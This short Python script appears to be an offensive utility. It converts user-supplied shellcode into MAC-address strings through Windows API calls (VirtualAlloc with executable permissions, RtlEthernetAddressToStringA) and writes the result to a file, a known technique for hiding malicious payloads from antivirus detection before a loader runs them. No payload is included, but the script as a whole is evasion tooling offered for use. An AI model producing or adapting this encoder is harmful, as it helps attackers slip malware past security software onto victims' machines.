import ctypes

#Input your shellcode like:\xfc\x48\x83\xe4\xf0\xe8\xxx
shellcode = b'Your shellcode'

mac = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode)/6*17, 0x3000, 0x40)

for i in range(len(shellcode)/6):
     bytes_shellcode = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_shellcode, mac+i*17)

a = ctypes.string_at(mac, len(shellcode)*3-1)
#print(a)

l = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(mac+i*17, 17)
    l.append(d)

mac_shellcode = str(l).replace("'", "\"").replace(" ", "").replace("\r\n","")
with open("mac_shell.txt", "w+") as f:
    f.write(mac_shellcode)


